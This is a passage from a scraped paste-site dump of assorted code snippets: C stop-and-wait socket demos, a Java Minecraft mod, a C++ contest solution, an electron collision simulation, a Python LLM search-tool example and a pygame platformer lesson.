            snprintf(buff, sizeof(buff), ""%d"", ack);
            send(connfd, buff, sizeof(buff), 0);
            break;
        case 1:
            ack = f;
            sleep(2);
            printf(""Frame %d received\nAcknowledgement sent: %d\n"", f, ack);
            bzero(buff, MAX);
            snprintf(buff, sizeof(buff), ""%d"", ack);
            send(connfd, buff, sizeof(buff), 0);
            next = ack + 1;
            break;
        case 2:
            ack = f;
            printf(""Frame %d received\nAcknowledgement sent: %d\n"", f, ack);
            bzero(buff, MAX);
            snprintf(buff, sizeof(buff), ""%d"", ack);
            send(connfd, buff, sizeof(buff), 0);
            next = ack + 1;
            break;
        }
    }
}
void main()
{
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        printf(""Socket creation failed\n"");
        exit(0);
    }
    else
        printf(""Socket successfully created\n"");
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
    if ((bind(sockfd, (SA *)&servaddr, sizeof(servaddr))) != 0)
    {
        printf(""socket bind failed\n"");
        exit(0);
    }
    else
        printf(""Socket successfully binded\n"");
    if ((listen(sockfd, 5)) != 0)
    {
        printf(""Listen failed\n"");
        exit(0);
    }
    else
        printf(""Server listening\n"");
    len = sizeof(cli);
    connfd = accept(sockfd, (SA *)&cli, &len);
    if (connfd < 0)
    {
        printf(""Server accept failed\n"");
        exit(0);
    }
    else
        printf(""Server accept the client\n"");
    func(connfd);
    close(sockfd);
}"
YRWZSJ3n,SnW_receiver,Bewin,C,Monday 24th of March 2025 12:57:05 PM CDT,"#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    int socket_desc, client_sock, client_size;
    struct sockaddr_in server_addr, client_addr;
    char buffer[1024];              //for snw
    int k=5,m=1,p;                    //for snw
    
    
    // Create socket:
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    
    if(socket_desc < 0){
        printf(""Error while creating socket\n"");
        return -1;
    }
    printf(""Socket created successfully\n"");
    
    // Set port and IP:
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(2000);
    server_addr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
    
    // Bind to the set port and IP:
    if(bind(socket_desc, (struct sockaddr*)&server_addr, sizeof(server_addr))<0){
        printf(""Couldn't bind to the port\n"");
        return -1;
    }
    printf(""Done with binding\n"");
    
    // Listen for clients:
    if(listen(socket_desc, 1) < 0){
        printf(""Error while listening\n"");
        return -1;
    }
    printf(""\nListening for incoming connections.....\n"");
    
    // Accept an incoming connection:
    client_size = sizeof(client_addr);
    client_sock = accept(socket_desc, (struct sockaddr*)&client_addr, &client_size);
    
    if (client_sock < 0){
        printf(""Can't accept\n"");
        return -1;
    }
    printf(""Client connected at IP: %s and port: %i\n"", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
    
    while(k!=0)    //demo for 5 packets
    {
                   int y = recv(client_sock,buffer,1024,0);
                   if(y==-1)
                   {
                            printf(""Error in receiving"");
                            exit(1);
                   }
                   if(strncmp(buffer,""frame"",5)==0)
                         printf(""Received frame %d successfully\n"",m);
                   else
                       printf(""Frame %d not received\n"",m);
                   if(m%2==0)
                             strcpy(buffer,""ack"");
                   else
                   {
                             strcpy(buffer,""kca"");
                             printf(""Ack lost\n"");
                             for(p=1;p<=3;p++)
                             {
                                printf(""Waiting for %d seconds\n"",p);
                             }
                             printf(""Retransmitting ack...\n"");
                             strcpy(buffer,""ack"");
                             sleep(3);
                   }
                   printf(""sending ack %d\n"",m);
                   int z= send(client_sock, buffer,19,0);
                   if(z==-1)
                   {
                            printf(""Error in sending"");
                            exit(1);
                   }
                   k--;
                   m++;
    }                       
    // Closing the socket:
    close(client_sock);
    close(socket_desc);
    
    return 0;
}"
UWqXXVvP,SnW_sender,Bewin,C,Monday 24th of March 2025 12:56:26 PM CDT,"#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    int socket_desc;
    struct sockaddr_in server_addr;
    char buffer[1024];             //for snw
    int k=5,m=1,p;                   //for snw
    // Clean buffers:
    //memset(server_message,'\0',sizeof(server_message));
    //memset(client_message,'\0',sizeof(client_message));
    
    // Create socket:
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    
    if(socket_desc < 0){
        printf(""Unable to create socket\n"");
        return -1;
    }
    
    printf(""Socket created successfully\n"");
    
    // Set port and IP the same as server-side:
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(2000);
    server_addr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
    
    // Send connection request to server:
    if(connect(socket_desc, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
        printf(""Unable to connect\n"");
        return -1;
    }
    printf(""Connected with server successfully\n"");
    
    while(k!=0)
    {
               if(m<=5)
                       printf(""Sending frame %d\n"",m);
               if(m%2==0)
                         strcpy(buffer,""frame"");
               else
               {
                   strcpy(buffer,""error"");
                   printf(""Packet loss\n"");
                   for(p=1;p<=3;p++)
                   {                             
                                printf(""Waiting for %d seconds\n"",p);
                   }
                   printf(""retransmitting...\n"");
                   strcpy(buffer,""frame"");
                   sleep(3);
               }
               int y= send(socket_desc,buffer,19,0);
               if(y==-1)
               {
                        printf(""Error in sending"");
                        exit(1);
               }
               else
               {
                   printf(""Sent frame %d\n"",m);
               }
               int z=recv(socket_desc,buffer,1024,0);
               if(z==-1)
                        printf(""Error in receiving data"");
               if(strncmp(buffer,""ack"",3)==0)
                         printf(""Received ACK for frame %d \n"",m);
                
               k--;
               m++;
    }              
    // Close the socket:
    close(socket_desc);
    
    return 0;
}"
mJqYBGmS,Untitled,flidiii,Java,Monday 24th of March 2025 12:50:48 PM CDT,"public static final Map<UUID, StellarPlayerEntity> playerMap = new HashMap<>();


	@Override
	public void onInitialize() {
		ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
			PlayerEntity player = handler.player;

			// Проверяем, если игрок не является StellarPlayerEntity, создаем его
			if (!(player instanceof StellarPlayerEntity)) {
				StellarPlayerEntity stellarPlayer = new StellarPlayerEntity(player.getWorld(), player.getBlockPos(), player.getYaw(), player.getGameProfile());
				StellarCore.playerMap.put(player.getUuid(), stellarPlayer);
			} else {
				// Если игрок уже является StellarPlayerEntity, добавляем его в карту
				StellarCore.playerMap.put(player.getUuid(), (StellarPlayerEntity) player);
			}

			// Выводим список игроков
			StringBuilder playerListMessage = new StringBuilder(""Игроки на сервере: "");
			for (Map.Entry<UUID, StellarPlayerEntity> entry : StellarCore.playerMap.entrySet()) {
				playerListMessage.append(entry.getValue().getPlayer().getDisplayName()).append("", "");
			}

			// Убираем последнюю запятую и пробел
			if (playerListMessage.length() > 0) {
				playerListMessage.setLength(playerListMessage.length() - 2);
			}

			// Отправляем сообщение всем игрокам на сервере
			server.getPlayerManager().broadcast(Text.literal(playerListMessage.toString()), false);
		});
	}
"
65cZBGpf,Untitled,flidiii,Java,Monday 24th of March 2025 12:41:05 PM CDT,"package stellarcore.mixin;

import net.minecraft.entity.ItemEntity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.stat.Stats;
import net.minecraft.text.Text;
import net.minecraft.world.World;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Unique;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;
import stellarcore.ModularInventory;
import stellarcore.NewPlayerEntity;
import stellarcore.StellarPlayerEntity;

@Mixin(ItemEntity.class)
public class ItemPickUpMixin{
    @Inject(at = @At(""HEAD""), method = ""onPlayerCollision"", cancellable=true)
    private void onPlayerCollision(PlayerEntity player, CallbackInfo info) {
        if (player instanceof NewPlayerEntity) {
            ItemEntity itemEntity = (ItemEntity) (Object) this;
            ItemStack itemStack = itemEntity.getStack();

            if (itemStack.isEmpty()) return;

            try {
                NewPlayerEntity customPlayer = (NewPlayerEntity) player;
                StellarPlayerEntity stellarPlayerEntity = customPlayer.getStellarPlayerEntity();
                ModularInventory modularInventory = stellarPlayerEntity.getModularInventory();
                player.sendMessage(Text.of(""Пытаюсь добавить "" + itemStack.getCount() + "" "" + itemStack.getItem().getName().getString()), false);

                int count = itemStack.getCount();
                boolean added = modularInventory.addItem(itemStack.copy()); // Важно использовать копию!

                if (added) {
                    player.sendMessage(Text.of(""Предмет добавлен в модульный инвентарь""), false);
                    player.sendPickup(itemEntity, count);
                    player.increaseStat(Stats.PICKED_UP.getOrCreateStat(itemStack.getItem()), count);

                    itemEntity.discard();
                    info.cancel();
                } else {
                    player.sendMessage(Text.of(""Не удалось добавить предмет в модульный инвентарь""), false);
                }
            } catch (Exception e) {
                player.sendMessage(Text.of(""Ошибка: "" + e.getMessage()), false);
            }
        }
    }
}
"
bH70njTs,Untitled,Josif_tepe,C++,Monday 24th of March 2025 12:23:32 PM CDT,"#include <iostream>
#include <vector>
using namespace std;
typedef long long ll;
const ll INF = 1e18;
int main() {
    ll k, x;
    cin >> k >> x;
    
    ll power = 1;
    ll res = INF;
    
    for(int i = 0; i < 100; i++) {
        ll tmp = power * k;
        if(tmp <= x) {
            if(x % tmp == 0) {
                ll quotient = x / tmp;
                if(quotient * k * power == x) {
                    res = min(res, i + quotient);
                }
            }
        }
        else {
            break;
        }
        power *= k;
    }
    if(res == INF) {
        res = -1;
    }
    cout << res << endl;
    
    return 0;
}
"
EHDPTH4K,Thermalization_1,phystota,C++,Monday 24th of March 2025 12:09:38 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#define n_e 100000
#define V_0 30000.0     // max velocity using to generate random distribution ---- doesn't work -> produces skew distribution???
#define Emin 0.0
#define Emax 100.0
#define bin_width 0.5
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.6E-19 // elementary charge    
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define P 0.005
#define steps 100

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function
    void initialize(std::mt19937 gen, std::uniform_real_distribution<double> dis) {
        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double sinTheta = dis(gen);
        double cosTheta = sqrt(1.0 - sinTheta*sinTheta); 
        
        energy = Emax*dis(gen);
        
        double speed = sqrt(2*energy*k_b/m_e);

        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;

    }

};

int main() {

    double electron_vel[3*n_e];
    double electron_e[n_e];
    int histo_random[N] = {0};
    int histo_maxwell[N] = {0};
    bool collided[n_e] = {0};

    clock_t start = clock();

    for (int i = 0; i < 3*n_e; i++){
        electron_vel[i] = 0.0;
    }    

    for (int i = 0; i < n_e; i++){
        electron_e[i] = 0.0;
    }     


    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);                

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);

    std::random_device rd1;
    std::mt19937 gen1(rd1());
    std::uniform_int_distribution<int> pair(0, n_e-1);


    for (int i = 0; i < n_e; i++){

        double phi = 2*M_PI*dis(gen);
        double sinTheta = dis(gen);
        double cosTheta = sqrt(1.0 - sinTheta*sinTheta); 
        
        double energy = Emax*dis(gen);
        double speed = sqrt(2*energy*k_b/m_e);

        electron_vel[i*3] = speed * sinTheta * cos(phi); // x component
        electron_vel[i*3+1] = speed * sinTheta * sin(phi); // y component
        electron_vel[i*3+2] = speed * cosTheta; // z component
        
        electron_e[i] = energy;

        file0  << i << "" "" << electron_vel[i*3] << "" "" << electron_vel[i*3+1] << "" "" << electron_vel[i*3+2]  << ""\n"";

        file1 << i << "" "" << electron_e[i] << ""\n""; 

        energy = 0.0;
    }

    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electron_e[i] - Emin)/bin_width );
        if (bin >=0 && bin < N)
            histo_random[bin]++;
    }

    for (int i = 0; i < N; i++){
        double bin_start = Emin + i*bin_width;
//        printf(""%5.1f - %5.1f\t%d\n"", bin_start, bin_start + bin_width, histo_random[i]);
        file3 << i*bin_width << "" "" <<  static_cast<double>(histo_random[i]) << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int t = 0; t < steps; t++){

        std::ostringstream filename;
        filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

        std::ofstream file(filename.str());
        if (!file.is_open()){
        std::cerr << ""Error opening file: "" << filename.str() << std::endl;
        return 1;
        }

        // setting flags to false each timestep
        for (int j = 0; j < n_e; j++){
            collided[j] = false;
        }

        for (int i = 0 ; i < n_e; i++){
            if (dis(gen) < P) {
                int partner = -1;
                int attempts = 0;

                while (attempts < n_e){
                    int candidate = pair(gen1);
                    if (candidate != i && !collided[candidate]){
                        partner = candidate;
                        break;
                    }
                    attempts++;
                }

                if (partner != -1) {
                    collided[i] = true;
                    collided[partner] = true;
                }

                // ----   Collision energy redistribution module

                // first particle X Y Z initial velocities
                double V0_x_1 = electron_vel[i*3 + 0];
                double V0_y_1 = electron_vel[i*3 + 1];
                double V0_z_1 = electron_vel[i*3 + 2];

                // second particle X Y Z initial velocities
                double V0_x_2 = electron_vel[partner*3 + 0];
                double V0_y_2 = electron_vel[partner*3 + 1];
                double V0_z_2 = electron_vel[partner*3 + 2];

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2)/2.0;
                double V0_rel_y = (V0_y_1 - V0_y_2)/2.0;
                double V0_rel_z = (V0_z_1 - V0_z_2)/2.0;

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (V0_x_1 + V0_x_2)/2.0;
                double V_cm_y = (V0_y_1 + V0_y_2)/2.0;
                double V_cm_z = (V0_z_1 + V0_z_2)/2.0;

                double V_cm = sqrt(V_cm_x*V_cm_x + V_cm_y*V_cm_y + V_cm_z*V_cm_z);

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of first particle

                double V_x_1 = V_cm_x + V_rel_x/2.0;
                double V_y_1 = V_cm_y + V_rel_y/2.0;
                double V_z_1 = V_cm_z + V_rel_z/2.0;

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //calculating final velocity of second particle

                double V_x_2 = V_cm_x - V_rel_x/2.0;
                double V_y_2 = V_cm_y - V_rel_y/2.0;
                double V_z_2 = V_cm_z - V_rel_z/2.0;

                double V_2 = sqrt(V_x_2*V_x_2 + V_y_2*V_y_2 + V_z_2*V_z_2);\

                // calculating final energies of first and second colliding particles

                electron_e[i] = V_1*V_1*m_e/(2.0*k_b);
                electron_e[partner] = V_2*V_2*m_e/(2.0*k_b);           

                // --- collision energy redistrubution module ends    

            }
        }

        for (int i = 0; i < n_e; i++){
//        filename << i << "" "" << electron_e[i] << ""\n"";
        int bin = (int)( (electron_e[i] - Emin)/bin_width );
        if (bin >=0 && bin < N)
            histo_maxwell[bin]++;
        }

        for (int i = 0; i < N; i++){
            double bin_start = Emin + i*bin_width;
            file << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i]) << ""\n""; // later need to divide by total partcles number to get normalized distribution
            histo_maxwell[i] = 0;
        }

        file.close();

    }
//     for (int i = 0; i < n_e; i++){

//         file2 << i << "" "" << electron_e[i] << ""\n"";

//         int bin = (int)( (electron_e[i] - Emin)/bin_width );
//         if (bin >=0 && bin < N)
//             histo_maxwell[bin]++;
//     }

//     for (int i = 0; i < N; i++){
//         double bin_start = Emin + i*bin_width;
// //        printf(""%5.1f - %5.1f\t%d\n"", bin_start, bin_start + bin_width, histo_maxwell[i]);
//         file4 << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i]) << ""\n""; // dividing by partcles number to get normalized distribution
//     }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;


}"
HxsJ60ys,Simple LLM Function Calling Example,AightBits,Python,Monday 24th of March 2025 12:08:10 PM CDT,"import requests
import json
from duckduckgo_search import DDGS

# === Config ===
API_URL = ""http://localhost:5000/v1/chat/completions""
API_KEY = """"
MODEL_NAME = """"
SYSTEM_PROMPT = (
    ""You are an assistant that can perform function calls using search_duckduckgo({ \""query\"": \""...\"" }). ""
    ""Only use the function when the user asks for recent, location-specific, or online information. ""
    ""After the function is called, and relevant information is returned, continue the conversation using it.\n\n""
    ""Examples:\n""
    ""User: Who won the Oscar for Best Picture this year?\n""
    ""Assistant: search_duckduckgo({ \""query\"": \""2025 Best Picture Oscar winner\"" })\n""
    ""Assistant: The winner of Best Picture at the 2025 Oscars was The Midnight Star.\n\n""
    ""User: What's the weather like in New York City?\n""
    ""Assistant: search_duckduckgo({ \""query\"": \""current weather in New York City\"" })\n""
    ""Assistant: It's currently 52°F and mostly cloudy in NYC, with winds around 10 mph.\n\n""
    ""User: How do I reverse a string in Python?\n""
    ""Assistant: You can reverse a string by using slicing: my_string[::-1]\n\n""
    ""Begin.""
)

# === Search Function ===
def duckduckgo_search(query, num_results=3):
    try:
        ddgs = DDGS()
        results = ddgs.text(query, max_results=num_results)
        return [
            {
                ""title"": r.get(""title"", ""No title""),
                ""link"": r.get(""href"", ""No link""),
                ""snippet"": r.get(""body"", ""No snippet"")
            }
            for r in results
        ]
    except Exception:
        return []

# === LLM Call ===
def call_llm(messages):
    headers = {""Content-Type"": ""application/json""}
    if API_KEY:
        headers[""Authorization""] = f""Bearer {API_KEY}""  # Optional for local models

    payload = {
        ""model"": MODEL_NAME,
        ""messages"": messages,
        ""temperature"": 0.7,
        ""max_tokens"": 1000
    }

    response = requests.post(API_URL, headers=headers, json=payload)
    return response.json() if response.status_code == 200 else None

# === Extract Function Call ===
def extract_function_call(content):
    if ""search_duckduckgo"" in content:
        try:
            start = content.find('{')
            end = content.find('}', start)
            if start != -1 and end != -1:
                return json.loads(content[start:end+1])
        except Exception:
            pass
    return None

# === Main Loop ===
def main():
    history = [{""role"": ""system"", ""content"": SYSTEM_PROMPT}]

    while True:
        user_input = input(""\nUser: "")
        if user_input.lower() in {""exit"", ""quit""}:
            break

        history.append({""role"": ""user"", ""content"": user_input})
        response = call_llm(history)
        if not response:
            continue

        message = response[""choices""][0][""message""]
        content = message.get(""content"", """")
        function_args = extract_function_call(content)

        if function_args:
            query = function_args.get(""query"", """")
            results = duckduckgo_search(query)

            # Format result text for assistant use
            result_text = ""\n\n"".join(
                f""{r['snippet']} ({r['title']}, {r['link']})"" for r in results
            )

            # Prepare list of sources for final output
            source_links = [f""{r['title']}: {r['link']}"" for r in results]

            # Inject function call and results as assistant content
            history.append({""role"": ""assistant"", ""content"": content})
            history.append({""role"": ""assistant"", ""content"": result_text})

            # Request continuation with new knowledge
            followup = call_llm(history)
            if followup:
                final_message = followup[""choices""][0][""message""][""content""]

                # Append sources at the end
                if source_links:
                    final_message += ""\n\nSources:\n"" + ""\n"".join(source_links)

                print(f""\n{final_message}\n"")
                history.append({""role"": ""assistant"", ""content"": final_message})
        else:
            print(f""\n{content}\n"")
            history.append({""role"": ""assistant"", ""content"": content})

if __name__ == ""__main__"":
    main()"
GgJxLyYp,Lesson 4 - Classes,MCreeper12731,Python,Monday 24th of March 2025 12:01:27 PM CDT,"import pygame
pygame.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Platformer Game"")

# Spremenljivke, ki jih bomo potrebovali za igralca
# ---
player_image = pygame.image.load(""images/scratch-cat.png"") # SPREMENI NA SVOJO SLIKO
player_width = 75
player_height = 75
player_image = pygame.transform.scale(player_image, (player_width, player_height))
player = pygame.Rect(200, 200, player_width, player_height)

speed_x = 0
speed_y = 0

platforms = [ pygame.Rect(300, 500, 200, 20), pygame.Rect(600, 350, 200, 20), pygame.Rect(900, 400, 200, 20)]

# ---

def resolve_collision(rect_a, rect_b):
    # Compute overlap distances in x and y
    dx1 =  - (rect_a.left - rect_b.right)
    dx2 = rect_a.right - rect_b.left
    dy1 = rect_b.bottom - rect_a.top
    dy2 = rect_a.bottom - rect_b.top

    # Find the smallest displacement to separate them
    min_dx = min(dx1, dx2)
    min_dy = min(dy1, dy2)

    if min_dx < min_dy:
        # Move rect_a left or right
        if dx1 < dx2:
            rect_a.x += dx1  # Move right
        else:
            rect_a.x -= dx2  # Move left
    else:
        # Move rect_a up or down
        if dy1 < dy2:
            rect_a.y += dy1  # Move down
        else:
            rect_a.y -= dy2  # Move up
    
    return True  # Collision was resolved

# Glavna zanka igre
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))
    # background_image = pygame.image.load(""images/New Piskel.png"")
    # background_image = pygame.transform.scale(background_image, (width, height))
    # window.blit(background_image, (0, 0))
    # Premikanje igralčevega lika
    # ---

    # Vsako ponovitev zanke (vsak frame) dobimo pritisnjene tipke
    # in se glede na njih odločimo, kako bomo igralca premaknili
    keys = pygame.key.get_pressed()
    if keys[pygame.K_d]:
        speed_x = 5
    elif keys[pygame.K_a]:
        speed_x = -5
    else:
        speed_x = 0

    if keys[pygame.K_SPACE]:
        speed_y = -15

    speed_y += 1

    player.x += speed_x
    player.y += speed_y

    if player.x < 0:
        player.x = 0
    if player.x > width - player_width:
        player.x = width - player_width
    if player.y < 0:
        player.y = 0
    if player.y > height - player.height:
        player.y = height - player.height
    
    for platform in platforms:
        if player.colliderect(platform):
            resolve_collision(player, platform)
        
    # ---
    # Izris likov
    # ---

    window.blit(player_image, player)
    for platform in platforms:
        pygame.draw.rect(window, (0, 127, 0), platform)
        # window.blit(slika_ovire, platform)

    # ---

    pygame.display.update()
    clock.tick(60)

pygame.quit()"
